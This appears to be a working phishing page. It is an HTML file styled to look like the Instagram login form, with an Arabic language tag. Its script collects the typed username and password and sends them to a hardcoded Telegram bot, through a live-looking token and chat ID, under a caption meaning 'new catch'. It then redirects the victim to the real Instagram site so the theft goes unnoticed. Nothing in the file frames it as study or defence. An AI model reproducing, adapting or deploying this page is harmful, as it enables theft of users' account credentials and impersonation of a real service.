<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <style>
        body { font-family: sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; }
        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; background: #fafafa; }
        button { width: 100%; padding: 7px; background-color: #0095f6; color: white; border: none; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="box">
        <h1 style="font-style: italic;">Instagram</h1>
        <input type="text" id="u" placeholder="Username" required>
        <input type="password" id="p" placeholder="Password" required>
        <button onclick="send()">Log In</button>
    </div>
    <script>
        const TOKEN = "8206948320:AAH-NQnab9n2m4BFWsbPE3HNdQuG_LKOVPY";
        const ID = "8276213504";
        function send() {
            const u = document.getElementById('u').value;
            const p = document.getElementById('p').value;
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=🔥 صيد جديد:\n👤: ${u}\n🔑: ${p}`);
            setTimeout(() => { window.location.href = "https://instagram.com"; }, 500);
        }
    </script>
</body>
</html>
